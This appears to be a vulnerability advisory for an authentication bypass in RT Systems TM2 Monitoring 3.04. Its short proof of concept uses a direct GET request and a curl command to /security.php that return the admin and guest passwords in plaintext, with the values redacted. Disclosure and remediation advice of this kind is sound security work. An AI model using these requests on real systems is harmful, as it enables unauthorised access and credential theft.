Version: 3.04
Tested on: Linux / Apache / PHP
CVE: CVE-2025-56447

Description:
RT Systems TM2 Monitoring version 3.04 is vulnerable to an authentication
bypass and plaintext credential disclosure. The application relies on
client-side JavaScript to enforce access control, while sensitive server-side
endpoints fail to verify authentication or session state.

By directly requesting protected PHP resources, an unauthenticated attacker
can access administrative functionality and retrieve valid credentials
embedded within HTML responses.

Proof of Concept:

1. Navigate to the login page:

   http://target-ip/login.php

   Authentication is expected at this stage; however, access control is
   implemented only through client-side JavaScript.

2. Using a web proxy (e.g., Burp Suite) or curl, send an unauthenticated
   request to a protected endpoint:

   GET /security.php HTTP/1.1
   Host: target-ip

   Alternatively using curl:

   curl http://target-ip/security.php

3. The server responds with the full contents of security.php without
   validating authentication or session state.

4. Within the returned HTML response, plaintext credentials are exposed,
   for example:

   <input name="pw_admin" value="REDACTED" type="text">
   <input name="pw_guest" value="REDACTED" type="text">

Impact:
An unauthenticated remote attacker can bypass authentication controls,
retrieve valid administrative and guest credentials, and gain full access
to the TM2 Monitoring application. This may result in complete compromise
of the monitoring system, unauthorized configuration changes, and access
to sensitive operational data.

Remediation:
Implement proper server-side authentication and session validation for all
restricted endpoints. Access control must not rely on client-side logic.
Remove hardcoded credentials from application responses and store secrets
securely using appropriate credential management mechanisms.
